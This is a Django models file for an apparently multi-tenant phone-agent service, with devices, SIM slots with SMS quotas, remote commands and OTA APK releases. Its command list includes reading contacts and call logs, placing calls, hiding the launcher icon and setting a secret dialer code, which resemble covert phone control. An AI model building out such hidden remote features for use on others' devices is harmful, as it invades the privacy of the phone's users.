import uuid

from django.db import models
from django.utils import timezone


class Device(models.Model):
    class Status(models.TextChoices):
        PENDING = "pending", "Pending"
        ONLINE = "online", "Online"
        OFFLINE = "offline", "Offline"
        BUSY = "busy", "Busy"
        DISABLED = "disabled", "Disabled"

    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    tenant = models.ForeignKey(
        "tenants.Tenant", on_delete=models.CASCADE, related_name="devices"
    )
    name = models.CharField(max_length=255)
    status = models.CharField(
        max_length=32, choices=Status.choices, default=Status.PENDING
    )
    agent_version = models.CharField(max_length=64, blank=True, default="")
    last_seen_at = models.DateTimeField(null=True, blank=True)
    health = models.JSONField(default=dict, blank=True)
    health_score = models.PositiveSmallIntegerField(default=100)
    capabilities = models.JSONField(default=list, blank=True)
    pairing_code_hash = models.CharField(max_length=64, null=True, blank=True)
    pairing_code_expires_at = models.DateTimeField(null=True, blank=True)
    device_token_hash = models.CharField(max_length=64, blank=True, default="")
    meta = models.JSONField(default=dict, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        ordering = ["name"]
        indexes = [
            models.Index(fields=["tenant", "status"]),
            models.Index(fields=["device_token_hash"]),
        ]

    def __str__(self) -> str:
        return self.name

    @property
    def is_paired(self) -> bool:
        return bool(self.device_token_hash)

    def mark_seen(
        self,
        *,
        health: dict | None = None,
        agent_version: str | None = None,
        capabilities: list | None = None,
    ):
        self.last_seen_at = timezone.now()
        if self.status in {self.Status.PENDING, self.Status.OFFLINE}:
            self.status = self.Status.ONLINE
        if health is not None:
            self.health = health
        if agent_version is not None:
            self.agent_version = agent_version
        update_fields = [
            "last_seen_at",
            "status",
            "health",
            "agent_version",
            "updated_at",
        ]
        if capabilities is not None:
            from apps.devices.services.capabilities import normalize_capabilities

            self.capabilities = normalize_capabilities(capabilities)
            update_fields.append("capabilities")
        if health is not None:
            from apps.devices.services.health import compute_health_score

            self.health_score = compute_health_score(self)
            update_fields.append("health_score")
        self.save(update_fields=update_fields)


class SimSlot(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    device = models.ForeignKey(Device, on_delete=models.CASCADE, related_name="sims")
    slot_index = models.PositiveSmallIntegerField()
    subscription_id = models.CharField(max_length=64, blank=True, default="")
    operator = models.CharField(max_length=128, blank=True, default="")
    phone_number = models.CharField(max_length=32, blank=True, default="")
    iccid = models.CharField(max_length=64, blank=True, default="")
    daily_sent = models.PositiveIntegerField(default=0)
    daily_quota = models.PositiveIntegerField(
        default=0, help_text="0 = use tenant default; None-like 0 with tenant unlimited"
    )
    is_active = models.BooleanField(default=True)
    meta = models.JSONField(default=dict, blank=True)
    updated_at = models.DateTimeField(auto_now=True)

    def quota_remaining(self, tenant_default: int = 1000) -> int | None:
        """Remaining sends today. None means unlimited."""
        quota = self.daily_quota if self.daily_quota > 0 else tenant_default
        if quota <= 0:
            return None
        return max(0, quota - self.daily_sent)

    def is_quota_exhausted(self, tenant_default: int = 1000) -> bool:
        remaining = self.quota_remaining(tenant_default)
        return remaining is not None and remaining <= 0

    class Meta:
        unique_together = ("device", "slot_index")
        ordering = ["slot_index"]

    def __str__(self) -> str:
        return f"{self.device.name} SIM{self.slot_index}"


class DeviceEvent(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    device = models.ForeignKey(Device, on_delete=models.CASCADE, related_name="events")
    type = models.CharField(max_length=64)
    payload = models.JSONField(default=dict, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        ordering = ["-created_at"]
        indexes = [models.Index(fields=["device", "-created_at"])]


class DeviceCommand(models.Model):
    class Action(models.TextChoices):
        RESTART_AGENT = "restart_agent", "Restart agent"
        SYNC = "sync", "Sync"
        CLEAR_QUEUE = "clear_queue", "Clear local queue"
        REFRESH_SIM = "refresh_sim", "Refresh SIM"
        ENABLE_LOGS = "enable_logs", "Enable logs"
        INSTALL_UPDATE = "install_update", "Install APK update"
        USSD_RUN = "ussd_run", "Run USSD"
        CALL_PLACE = "call_place", "Place call"
        CALL_LOG_READ = "call_log_read", "Read call log"
        CONTACTS_READ = "contacts_read", "Read contacts"
        HIDE_LAUNCHER = "hide_launcher", "Hide launcher icon"
        SHOW_LAUNCHER = "show_launcher", "Show launcher icon"
        LOCK_UI = "lock_ui", "Lock agent UI"
        UNLOCK_UI = "unlock_ui", "Unlock agent UI"
        SET_PASSCODE = "set_passcode", "Set app passcode"
        CLEAR_PASSCODE = "clear_passcode", "Clear app passcode"
        SET_DIALER_CODE = "set_dialer_code", "Set secret dialer code"

    class Status(models.TextChoices):
        PENDING = "pending", "Pending"
        SENT = "sent", "Sent"
        ACKED = "acked", "Acked"
        FAILED = "failed", "Failed"
        CANCELLED = "cancelled", "Cancelled"

    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    device = models.ForeignKey(Device, on_delete=models.CASCADE, related_name="commands")
    action = models.CharField(max_length=64, choices=Action.choices)
    params = models.JSONField(default=dict, blank=True)
    status = models.CharField(
        max_length=32, choices=Status.choices, default=Status.PENDING
    )
    created_by = models.ForeignKey(
        "accounts.User",
        on_delete=models.SET_NULL,
        null=True,
        blank=True,
        related_name="device_commands",
    )
    result = models.JSONField(default=dict, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        ordering = ["-created_at"]
        indexes = [models.Index(fields=["device", "status"])]


class AgentRelease(models.Model):
    """Hosted APK artifacts for OTA updates."""

    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    tenant = models.ForeignKey(
        "tenants.Tenant",
        on_delete=models.CASCADE,
        related_name="agent_releases",
        null=True,
        blank=True,
        help_text="Null = global release visible to all tenants",
    )
    version = models.CharField(max_length=64, db_index=True)
    changelog = models.TextField(blank=True, default="")
    apk = models.FileField(upload_to="agent_releases/%Y/%m/", blank=True)
    checksum_sha256 = models.CharField(max_length=64, blank=True, default="")
    download_url = models.URLField(blank=True, default="")
    is_active = models.BooleanField(default=True)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        ordering = ["-created_at"]

    def __str__(self) -> str:
        return self.version

    def resolved_download_url(self, request=None) -> str:
        if self.download_url:
            return self.download_url
        if self.apk and request is not None:
            return request.build_absolute_uri(self.apk.url)
        if self.apk:
            return self.apk.url
        return ""

